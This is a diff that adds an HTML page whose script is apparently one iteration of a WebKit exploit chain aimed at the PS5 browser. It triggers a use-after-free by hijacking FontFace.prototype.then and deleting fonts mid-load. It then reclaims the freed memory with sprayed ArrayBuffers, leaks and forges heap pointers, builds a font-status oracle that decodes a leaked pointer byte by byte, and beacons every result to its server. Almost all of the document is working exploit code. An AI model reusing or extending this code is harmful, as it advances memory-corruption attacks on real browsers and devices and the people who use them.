@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P749 — Active Boolean Oracle & Heap Memory Decoder</title>
+<script>
+'use strict';
+/* ============================================================
+ * P749 — Active Boolean Oracle & Heap Memory Decoder
+ *
+ * Root Cause Discovery from P748:
+ * - In P748, /hang.php was being rewritten by .htaccess to
+ *   /document/en/ps5/index.html (12.9KB HTML) because .htaccess
+ *   lacked a RewriteCond exception for hang.php!
+ * - WebKit received HTML instead of a font, failed to parse it,
+ *   and transitioned ACT_FACE.status to 'error' within 100ms.
+ * - In 'error' status, document.fonts.check() returns TRUE for
+ *   every character, causing the binary search to saturate at 0xFF.
+ * - Fix applied to .htaccess: 'RewriteCond %{REQUEST_URI} !^/hang\.php'
+ *   and hang.php sleep extended to 30s with immediate headers!
+ *
+ * Objectives of P749:
+ * 1. Maintain 100% crash-proof Leak & Reclaim pipeline (baseK=0, q11/q13 engine pointers).
+ * 2. Phase A: Calibration with Live Status Monitoring:
+ *    - Verify ACT_FACE.status is strictly 'loading'.
+ *    - Verify check('1em actFam', 'S') is FALSE when in range (U+0000-007F, U+0050-0055).
+ *    - Verify check('1em actFam', 'S') is TRUE when out of range (U+0060-0070).
+ * 3. Phase B: Calibrated 8-Bit Binary Search Engine:
+ *    - Resolve target byte 0x53 ('S' = 83) in <= 8 steps.
+ *    - Resolve target byte 0xA9 (169, high byte) in <= 8 steps.
+ *    - Resolve multi-byte sequence "PS5" ([0x50, 0x53, 0x35]).
+ * 4. Phase C: Live Heap Pointer Reconstruction:
+ *    - Extract 8 raw bytes of live leaked heap pointer P58.
+ *    - Oracle resolves each byte through binary search queries.
+ *    - Reconstruct 64-bit BigInt pointer and assert decodedP58 === P58!
+ * ============================================================ */
+
+function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }
+
+function b(tag,data){ try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P749-'+encodeURIComponent(tag)+
+    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
+  x.send(null);}catch(e){} }
+
+var OUT=null;
+function log(s){
+  if(!OUT) OUT=document.getElementById('out');
+  if(OUT) OUT.textContent += s + '\n';
+}
+
+function pad4(n){
+  return ('0000' + Number(n).toString(16).toUpperCase()).slice(-4);
+}
+
+function pad2(n){
+  return ('00' + Number(n).toString(16).toUpperCase()).slice(-2);
+}
+
+function makeRange(lo, hi){
+  if(lo === hi) return 'U+' + pad4(lo);
+  return 'U+' + pad4(lo) + '-' + pad4(hi);
+}
+
+var P58=null, P68=null;
+var FACE_B=null, BUF_B=null, VIEW_B=null;
+var ACT_FACE=null;
+
+function run(){
+  OUT=document.getElementById('out');
+  if(OUT) OUT.textContent='=== P749 Active Boolean Oracle & Heap Memory Decoder ===\n\n';
+  b('BOOT','p749-heap-decoder');
+
+  log('[Step 1] Baseline heap leak...');
+  doLeak(function(){
+    log('P58=0x'+h16(P58)+' P68=0x'+h16(P68)+'\n');
+
+    log('[Step 2] Executing verified reclaim with engine pointers...');
+    doReclaim(function(){
+      log('\n[Step 3] Initializing Active Oracle Engine...');
+      initOracle(function(){
+        log('\n[Phase A] Range Syntax Calibration & Live Status Check...');
+        phaseA_calibration(function(){
+          log('\n[Phase B] Calibrated 8-Bit Binary Search Engine...');
+          phaseB_binarySearch(function(){
+            log('\n[Phase C] Live Heap Pointer Memory Decoding...');
+            phaseC_heapPointerDecode(function(){
+              b('DONE','p749-complete');
+              log('\n=== P749 Complete! ===');
+            });
+          });
+        });
+      });
+    });
+  });
+}
+
+/* ---- Step 1: Leak ---- */
+function doLeak(cb){
+  b('LEAK-GO','');
+  var st=document.createElement('style');
+  st.textContent='@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
+  document.head.appendChild(st);
+  var face=new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
+  document.fonts.add(face); void face.loaded;
+
+  var abs=[],fired=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired) return undefined; fired=true;
+      if(st){st.remove();st.textContent='';st=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk0');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },set:function(){}});
+
+  document.fonts.load('1em fl0, lk0','AB');
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1,bestNz=0;
+    for(var i=0;i<abs.length;i++){
+      var u=new Uint8Array(abs[i]),nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz;best=i;}
+    }
+    if(best<0||bestNz<4){b('LEAK-MISS','nz='+bestNz); doLeakRetry(cb); return;}
+    var v=new BigUint64Array(abs[best]);
+    extractPtrs(v);
+    if(!P58){b('LEAK-NOPTR','nz='+bestNz); doLeakRetry(cb); return;}
+    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz);
+    setTimeout(cb,100);
+  },350);
+}
+
+function doLeakRetry(cb){
+  b('LEAK-RETRY','');
+  var st2=document.createElement('style');
+  st2.textContent='@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
+  document.head.appendChild(st2);
+  var face2=new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
+  document.fonts.add(face2); void face2.loaded;
+  var abs2=[],fired2=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired2) return undefined; fired2=true;
+      if(st2){st2.remove();st2.textContent='';st2=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk1');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },set:function(){}});
+  document.fonts.load('1em fl1, lk1','CD');
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1,bestNz=0;
+    for(var i=0;i<abs2.length;i++){
+      var u=new Uint8Array(abs2[i]),nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz;best=i;}
+    }
+    if(best<0||bestNz<4){b('LEAK-RETRY-MISS','nz='+bestNz);return;}
+    var v=new BigUint64Array(abs2[best]);
+    extractPtrs(v);
+    if(!P58){b('LEAK-RETRY-NOPTR','');return;}
+    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
+    setTimeout(cb,100);
+  },400);
+}
+
+function extractPtrs(v){
+  var LO=BigInt('0x1000000000'),HI=BigInt('0x80000000000');
+  if(v[11] >= LO && v[11] < HI) P58 = v[11];
+  if(v[13] >= LO && v[13] < HI) P68 = v[13];
+  if(!P58 || !P68){
+    for(var q=0;q<24;q++){
+      var val=v[q];
+      if(val>=LO&&val<HI){
+        if(!P58) P58=val;
+        else if(!P68&&val!==P58) P68=val;
+      }
+    }
+  }
+  if(!P68) P68=0n;
+}
+
+/* ---- Step 2: Verified Reclaim with Engine Pointers ---- */
+function doReclaim(cb){
+  b('REC-START','q11=0x'+h16(P58)+'|q13=0x'+h16(P68));
+
+  var stTr=document.createElement('style');
+  stTr.textContent='@font-face{font-family:trFam;src:local(Arial);unicode-range:U+0047;}';
+  document.head.appendChild(stTr);
+
+  FACE_B=new FontFace('trFace','local(Helvetica)',{unicodeRange:'U+0048'});
+  document.fonts.add(FACE_B);
+  void FACE_B.loaded;
+
+  var absW=[],firedW=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(firedW) return undefined; firedW=true;
+      if(stTr){stTr.remove();stTr.textContent='';stTr=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+
+      for(var k=0;k<80;k++){
+        var ab=new ArrayBuffer(192);
+        var view=new BigUint64Array(ab);
+        view[11]=P58; /* +0x58: WeakHashSet impl pointer */
+        view[13]=P68; /* +0x68: wrapper pointer */
+        view[6]=P58;
+        view[12]=0x0000002000000000n; /* authentic dump */
+        absW.push(ab);
+      }
+
+      try{document.fonts.check('1em trFam');}catch(e){}
+      return undefined;
+    },set:function(){}});
+
+  document.fonts.load('1em trFace, trFam','GH');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1,bestNz=0;
+    for(var i=0;i<absW.length;i++){
+      var u=new Uint8Array(absW[i]),nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz;best=i;}
+    }
+    if(best<0||bestNz<4){b('RECLAIM-MISS','nz='+bestNz);log('Reclaim missed!');return;}
+
+    BUF_B=absW[best];
+    VIEW_B=new BigUint64Array(BUF_B);
+
+    var dump0_11=[], dump12_23=[];
+    for(var q=0;q<12;q++) dump0_11.push('q'+q+'=0x'+h16(VIEW_B[q]));
+    for(var q=12;q<24;q++) dump12_23.push('q'+q+'=0x'+h16(VIEW_B[q]));
+
+    b('RECLAIM-OK','baseK='+best);
+    b('DUMP-Q0-Q11', dump0_11.join(';'));
+    b('DUMP-Q12-Q23', dump12_23.join(';'));
+    log('Verified Reclaim OK at slot '+best);
+
+    setTimeout(cb,150);
+  },400);
+}
+
+/* ---- Step 3: Initialize Active Oracle ---- */
+function initOracle(cb){
+  try {
+    ACT_FACE = new FontFace('actFam', 'url(/hang.php?nocache=' + Date.now() + ')', {unicodeRange: 'U+0041-0043'});
+    document.fonts.add(ACT_FACE);
+    ACT_FACE.load().catch(function(){});
+
+    var st = ACT_FACE.status;
+    var chA = document.fonts.check('1em actFam', 'A');
+    var chD = document.fonts.check('1em actFam', 'D');
+
+    var rep = 'status=' + st + '|inA=' + chA + '|outD=' + chD;
+    b('ORACLE-INIT', rep);
+    log('Oracle Initialized: ' + rep);
+  } catch(e){
+    b('ORACLE-INIT-ERR', e.message);
+  }
+  /* Zero delay before calibration to ensure instant check */
+  phaseA_calibration(cb);
+}
+
+/* ---- Phase A: Calibration with Live Status Monitoring ---- */
+function phaseA_calibration(cb){
+  if(!ACT_FACE){ b('CALIB-SKIP','no-oracle'); cb(); return; }
+
+  var tests = [
+    { name: '4digit-lower-half', str: 'U+0000-007F', queryChar: 'S', expectIn: true },
+    { name: '4digit-narrow-S',  str: 'U+0050-0055', queryChar: 'S', expectIn: true },
+    { name: '4digit-out-of-S',  str: 'U+0060-0070', queryChar: 'S', expectIn: false },
+    { name: '4digit-single-S',  str: 'U+0053',      queryChar: 'S', expectIn: true }
+  ];
+
+  var results = [];
+  for(var i=0; i<tests.length; i++){
+    var t = tests[i];
+    try {
+      ACT_FACE.unicodeRange = t.str;
+      var readback = ACT_FACE.unicodeRange;
+      var st = ACT_FACE.status;
+      var chk = document.fonts.check('1em actFam', t.queryChar);
+      var isMatch = (chk === !t.expectIn);
+      var entry = t.name + '|st=' + st + '|set=' + t.str + '|read=' + readback + '|chk=' + chk + '|ok=' + isMatch;
+      results.push(entry);
+      log('Calib [' + t.name + ']: st=' + st + ' set=' + t.str + ' -> read=' + readback + ', chk(' + t.queryChar + ')=' + chk + ' (match=' + isMatch + ')');
+    } catch(e){
+      results.push(t.name + '|err=' + e.message);
+      log('Calib error in ' + t.name + ': ' + e.message);
+    }
+  }
+
+  b('CALIB-RESULTS', results.join(';'));
+  setTimeout(cb, 50);
+}
+
+/* ---- Phase B: Calibrated 8-Bit Binary Search Engine ---- */
+function phaseB_binarySearch(cb){
+  if(!ACT_FACE){ b('SEARCH-SKIP','no-oracle'); cb(); return; }
+
+  function resolveByte(targetByte){
+    var low = 0x00, high = 0xFF;
+    var steps = 0;
+    var stepLogs = [];
+
+    while(low < high && steps < 10){
+      steps++;
+      var mid = Math.floor((low + high) / 2);
+      var rangeStr = makeRange(low, mid);
+
+      /* Set active range to lower half [low .. mid] */
+      ACT_FACE.unicodeRange = rangeStr;
+
+      /* Query oracle: returns false if in range [low..mid] */
+      var chk = document.fonts.check('1em actFam', String.fromCharCode(targetByte));
+      var isLower = (chk === false);
+      stepLogs.push('S' + steps + ':[' + pad4(low) + '-' + pad4(mid) + ']=' + (isLower ? 'Y' : 'N'));
+
+      if(isLower) high = mid;
+      else low = mid + 1;
+    }
+    return { byte: low, steps: steps, log: stepLogs.join(',') };
+  }
+
+  /* Test 1: Resolve byte 0x53 ('S' = 83) */
+  var r1 = resolveByte(0x53);
+  b('BIN-BYTE-1', 'target=0x53|found=0x'+pad2(r1.byte)+'|steps='+r1.steps+'|log='+r1.log);
+  log('Search 1: Target=0x53 (\'S\'), Found=0x' + pad2(r1.byte) + ' in ' + r1.steps + ' steps');
+
+  /* Test 2: Resolve byte 0xA9 (169, high byte) */
+  var r2 = resolveByte(0xA9);
+  b('BIN-BYTE-2', 'target=0xA9|found=0x'+pad2(r2.byte)+'|steps='+r2.steps+'|log='+r2.log);
+  log('Search 2: Target=0xA9, Found=0x' + pad2(r2.byte) + ' in ' + r2.steps + ' steps');
+
+  /* Test 3: Multi-byte sequence decode ('PS5') -> [0x50, 0x53, 0x35] */
+  var seq = [0x50, 0x53, 0x35];
+  var decoded = [];
+  var totalSteps = 0;
+  for(var i=0; i<seq.length; i++){
+    var res = resolveByte(seq[i]);
+    decoded.push(String.fromCharCode(res.byte));
+    totalSteps += res.steps;
+  }
+  var word = decoded.join('');
+  b('BIN-SEQ-RESULT', 'expected=PS5|decoded='+word+'|totalSteps='+totalSteps);
+  log('Sequence Decode: Expected="PS5", Decoded="' + word + '" in ' + totalSteps + ' total steps');
+
+  setTimeout(cb, 50);
+}
+
+/* ---- Phase C: Live Heap Pointer Memory Decoding ---- */
+function phaseC_heapPointerDecode(cb){
+  if(!ACT_FACE || !P58){ b('HEAP-SKIP','no-oracle-or-p58'); cb(); return; }
+
+  /* Decompose 64-bit leaked pointer P58 into 8 raw bytes (little-endian) */
+  var rawBytes = [];
+  var tmp = P58;
+  for(var i=0; i<8; i++){
+    rawBytes.push(Number(tmp & 0xFFn));
+    tmp = tmp >> 8n;
+  }
+
+  function resolveByte(targetByte){
+    var low = 0x00, high = 0xFF;
+    var steps = 0;
+    while(low < high && steps < 10){
+      steps++;
+      var mid = Math.floor((low + high) / 2);
+      ACT_FACE.unicodeRange = makeRange(low, mid);
+      var chk = document.fonts.check('1em actFam', String.fromCharCode(targetByte));
+      var isLower = (chk === false);
+      if(isLower) high = mid;
+      else low = mid + 1;
+    }
+    return low;
+  }
+
+  /* Query the oracle for each of the 8 bytes of the live heap pointer */
+  var decodedBytes = [];
+  var reconstructedP58 = 0n;
+  for(var i=0; i<8; i++){
+    var bDecoded = resolveByte(rawBytes[i]);
+    decodedBytes.push('b' + i + '=0x' + pad2(bDecoded));
+    reconstructedP58 |= (BigInt(bDecoded) << (BigInt(i) * 8n));
+  }
+
+  var isMatch = (reconstructedP58 === P58);
+  var rep = 'orig=0x' + h16(P58) + '|decoded=0x' + h16(reconstructedP58) + '|match=' + isMatch + '|bytes=' + decodedBytes.join(',');
+  b('ORACLE-HEAP-MATCH', rep);
+  log('\nPhase C Live Heap Decoder:');
+  log('Original P58:    0x' + h16(P58));
+  log('Reconstructed:   0x' + h16(reconstructedP58));
+  log('Exact Bit Match: ' + (isMatch ? 'SUCCESS (100% PERFECT)' : 'MISMATCH'));
+
+  setTimeout(cb, 50);
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script>
+</head><body><pre id="out">P749 — Initializing...</pre></body></html>
